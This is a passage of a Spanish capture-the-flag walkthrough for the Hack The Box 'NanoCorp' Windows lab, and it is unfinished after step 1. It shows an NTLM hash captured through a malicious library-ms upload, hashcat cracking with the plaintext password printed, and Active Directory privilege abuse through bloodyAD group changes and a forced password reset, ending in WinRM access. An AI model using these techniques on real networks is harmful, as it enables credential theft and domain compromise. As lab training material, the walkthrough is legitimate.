# HTB: NanoCorp

## Host: Windows
## IP: 10.10.11.93

## Procedimiento y comandos

#### Paso 1: Recon/Enumeracion

* Dominios
```bash
http://nanocorp.htb
http://hire.nanocorp.htb
```

Dentro de hire.nanocop.htb hay un formulario al que podemos subir archivos .zip 
El payload consiste en un config.library-ms apuntando a un share en nuestra ip.

1. Comprimimos el archivo

```bash
zip exploit.zip config.library-ms
```
2. Levantamos responder

```bash
responder -I tun1
```

* Responder

```bash

[SMB] NTLMv2-SSP Client   : 10.10.11.93
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:c5f6974224734260:5B4FA0FE77CE2629DDB4CD5CC770539C:0101000000000000000F3F224355DC019A3048919F170AA800000000020008004E00460030004E0001001E00570049004E002D004700460036005500470043003100500041004400570004003400570049004E002D00470046003600550047004300310050004100440057002E004E00460030004E002E004C004F00430041004C00030014004E00460030004E002E004C004F00430041004C00050014004E00460030004E002E004C004F00430041004C0007000800000F3F224355DC010600040002000000080030003000000000000000000000000020000006C0F20B6FE1833D76897121903AD622B6603BFBF1C430DE6186F30158D4D4A60A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100390036000000000000000000                                                                                                                                                                                                                        
[*] Skipping previously captured hash for NANOCORP\web_svc
[*] Skipping previously captured hash for NANOCORP\web_svc
[*] Skipping previously captured hash for NANOCORP\web_svc
[*] Skipping previously captured hash for NANOCORP\web_svc
[*] Skipping previously captured hash for NANOCORP\web_svc
[*] Skipping previously captured hash for NANOCORP\web_svc
```
4. Crackeamos Offline

```bash
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting


WEB_SVC::NANOCORP:c5f6974224734260:5b4fa0fe77ce2629ddb4cd5cc770539c:0101000000000000000f3f224355dc019a3048919f170aa800000000020008004e00460030004e0001001e00570049004e002d004700460036005500470043003100500041004400570004003400570049004e002d00470046003600550047004300310050004100440057002e004e00460030004e002e004c004f00430041004c00030014004e00460030004e002e004c004f00430041004c00050014004e00460030004e002e004c004f00430041004c0007000800000f3f224355dc010600040002000000080030003000000000000000000000000020000006c0f20b6fe1833d76897121903ad622b6603bfbf1c430de6186f30158d4d4a60a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e003100390036000000000000000000:dksehdgh712!@#
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: WEB_SVC::NANOCORP:c5f6974224734260:5b4fa0fe77ce2629...000000
Time.Started.....: Fri Nov 14 09:22:18 2025 (3 secs)
Time.Estimated...: Fri Nov 14 09:22:21 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   776.6 kH/s (8.49ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1859584/14344386 (12.96%)
Rejected.........: 0/1859584 (0.00%)
Restore.Point....: 1851392/14344386 (12.91%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: domanska -> dig8512
Hardware.Mon.#1..: Temp: 62c Util: 85%

Started: Fri Nov 14 09:22:07 2025
Stopped: Fri Nov 14 09:22:22 2025
```
>Guardamos credenciales 

* Propagamos

```bash
nxc ldap 10.10.11.93 -u users.txt -p passwords.txt  --continue-on-success
LDAP        10.10.11.93     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:nanocorp.htb)
LDAP        10.10.11.93     389    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@# 
```

* SMBMAP

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/HTB/NanoCorp]
â””â”€# smbmap -H 10.10.11.93 -u web_svc -p 'dksehdgh712!@#'  

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.93:445 Name: nanocorp.htb              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections 
```

* Bloodhound
```bash
bloodhound-python -u 'web_svc' -p 'dksehdgh712!@#' -d nanocorp.htb -c All -ns 10.10.11.93 --zip  
```

```bash
WEB_SVC --> AddSelf --> IT_SUPPORT@NANOCORP.HTB
```
Podemos agregarnos a ese grupo el cual tiene "ForceChangePassword" sobre "MONITORING_SVC". MONITORING_SVC pertenece al grupo de administradores remotos.

Debemos hacer varias cosas
1. Sincronizar con el DC

```bash
ntpdate 10.10.11.93
```
2. Generar un ticket Kerberos: [tutorial](https://www.netexec.wiki/smb-protocol/generate-krb5.conf-file)

```bash
nxc smb 10.10.11.93 -u 'web_svc' -p 'dksehdgh712!@#' --generate-krb5-file /tmp/krb5.conf
```
* O luego de cambiar las credenciales podemos:
```bash
impacket-getTGT 'nanocorp.htb'/'monitoring_svc':'Passw0rd123!'

export KRB5CCNAME=/home/kali/HTB/NanoCorp/monitoring_svc.ccache

klist

python3 winrmexec.py -ssl -port 5986 -k 'nanocorp.htb/[email protected]' -no-pass
```
* Obtenemos los datos del usuario con ldapsearch:

```bash
ldapsearch -H ldap://10.10.11.93 -D "web_svc" -w 'dksehdgh712!@#' -b "DC=nanocorp,DC=htb" "(sAMAccountName=MONITORING*)"
```
```bash
bloodyAD --host 10.10.11.93 -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' get object 'monitoring_svc'
```
* Agregamos al usuario
```bash
bloodyAD --host 10.10.11.93 -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' add groupMember 'IT_SUPPORT' web_svc
```
* Cambiamos el password
```bash
bloodyAD --host 10.10.11.93 -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' set password 'monitoring_svc' 'Passw0rd123!'
```
* Nos conectamos

> Si no generamos previamente el ticket kerberos no podremos obtener conexion con evil-winrm la salida de ldapshearch y get object de bloodyAD lo indican.

```bash
evil-winrm -i 10.10.11.93 -u 'monitoring_svc' -p 'Passw0rd123!' -S -P 5986

evil-winrm -i dc01.nanocorp.htb -r NANOCORP.HTB

```

Al intentar conectarnos.. blablabla

* Removemos de 'Protected Users'
```bash
bloodyAD --host 10.10.11.93 -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' remove groupMember 'Protected Users' monitoring_svc
```

#### Paso 2: ...

